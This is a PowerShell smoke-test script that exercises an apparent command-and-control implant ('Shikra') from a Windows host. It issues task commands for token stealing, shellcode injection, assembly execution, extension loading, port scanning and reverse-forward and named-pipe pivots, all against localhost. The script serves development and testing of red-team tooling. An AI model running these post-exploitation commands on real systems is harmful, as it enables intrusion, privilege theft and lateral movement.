# M14 acceptance helper: exercises the full implant task surface against a
# running Shikra teamserver from a Windows host.
#
# Usage (from a Windows machine with the built shikra-client.exe):
#   powershell -ExecutionPolicy Bypass -File windows-post-test.ps1 `
#     -Client .\shikra-client.exe -Server https://10.0.0.1:8443 `
#     -CaCert .\ca.pem -Token <operator-token> -Session <session-id> `
#     -ShellcodeFile .\calc.bin -AssemblyFile .\hello.exe `
#     -WasmFile .\hello.wasm -NativeFile .\hello.dll -ExtensionName hello
param(
    [Parameter(Mandatory = $true)][string]$Client,
    [Parameter(Mandatory = $true)][string]$Server,
    [Parameter(Mandatory = $true)][string]$CaCert,
    [Parameter(Mandatory = $true)][string]$Token,
    [Parameter(Mandatory = $true)][string]$Session,
    [string]$ShellcodeFile,
    [string]$AssemblyFile,
    [string]$TargetPid,
    [string]$WasmFile,
    [string]$NativeFile,
    [string]$ExtensionName
)

$ErrorActionPreference = "Continue"
$env:SHIKRA_SERVER = $Server
$env:SHIKRA_CA_CERT = $CaCert
$env:SHIKRA_OPERATOR_TOKEN = $Token

function Invoke-Step {
    param([string]$Name, [scriptblock]$Action)
    Write-Host "== $Name =="
    & $Action
    if ($LASTEXITCODE -ne 0) {
        Write-Host "FAIL: $Name exited with $LASTEXITCODE" -ForegroundColor Red
    } else {
        Write-Host "ok:   $Name" -ForegroundColor Green
    }
    Write-Host
}

Invoke-Step "spawn notepad" { & $Client spawn --session $Session notepad.exe }
Start-Sleep -Seconds 1

$notepad = Get-Process notepad -ErrorAction SilentlyContinue | Select-Object -First 1
if ($notepad) {
    Invoke-Step "kill notepad" { & $Client kill --session $Session --pid $notepad.Id }
} else {
    Write-Host "warn: no notepad process found to kill"
}

Invoke-Step "screenshot" { & $Client screenshot --session $Session --output .\screen.bmp }

if ($TargetPid) {
    Invoke-Step "steal-token" { & $Client steal-token --session $Session --pid ([int]$TargetPid) }
    Invoke-Step "rev2self" { & $Client rev2self --session $Session }
}

if ($ShellcodeFile) {
    Invoke-Step "inject" { & $Client inject --session $Session --pid ([int]$TargetPid) $ShellcodeFile }
}

if ($AssemblyFile) {
    Invoke-Step "execute-assembly" { & $Client execute-assembly --session $Session $AssemblyFile }
}

# M11: staged delivery is covered by the server-side e2e; verify the profile
# rotation endpoint answers on this host.
Invoke-Step "http profile beacon path" {
    try {
        $response = Invoke-WebRequest -Uri "$Server/api/v1/enroll" -Method Head -TimeoutSec 5 -ErrorAction Stop
        Write-Host "enroll endpoint HTTP $($response.StatusCode)"
    } catch {
        if ($_.Exception.Response) {
            Write-Host "enroll endpoint HTTP $([int]$_.Exception.Response.StatusCode)"
        } else {
            throw
        }
    }
}

# M12: WASM + native extension round trip.
if ($WasmFile) {
    Invoke-Step "wasm-load" { & $Client wasm-load --session $Session --name hello $WasmFile }
    Invoke-Step "wasm-run" { & $Client wasm-run --session $Session --name hello --args "smoke" }
}

if ($NativeFile) {
    Invoke-Step "native-load" { & $Client native-load --session $Session --name hello $NativeFile }
    Invoke-Step "native-run" { & $Client native-run --session $Session --name hello --args "smoke" }
    Invoke-Step "native-list" { & $Client native-list --session $Session }
}

if ($ExtensionName) {
    Invoke-Step "extension push from registry" {
        & $Client extension-push --session $Session --name $ExtensionName --platform windows
    }
}

# M13: port scan + pivot surface.
Invoke-Step "portscan localhost" {
    & $Client portscan --session $Session --target 127.0.0.1 --ports 22,80,135,445,3389 --banner
}
Invoke-Step "rportfwd start/stop" {
    $output = & $Client rportfwd --session $Session --bind 127.0.0.1:19876 --to 127.0.0.1:445 2>&1
    Write-Host $output
    $match = $output | Select-String -Pattern '([0-9a-fA-F-]{36})'
    if ($match) {
        & $Client pivots
        & $Client rportfwd-stop --forward-id $match.Matches[0].Value
    }
}

# M13: named pipe pivot listener.
Invoke-Step "rportfwd pipe start/stop" {
    $output = & $Client rportfwd --session $Session --bind "\\.\pipe\shikra-smoke" --to 127.0.0.1:445 --transport pipe 2>&1
    Write-Host $output
    $match = $output | Select-String -Pattern '([0-9a-fA-F-]{36})'
    if ($match) {
        & $Client rportfwd-stop --forward-id $match.Matches[0].Value
    }
}

Write-Host "post-exploitation smoke test complete"
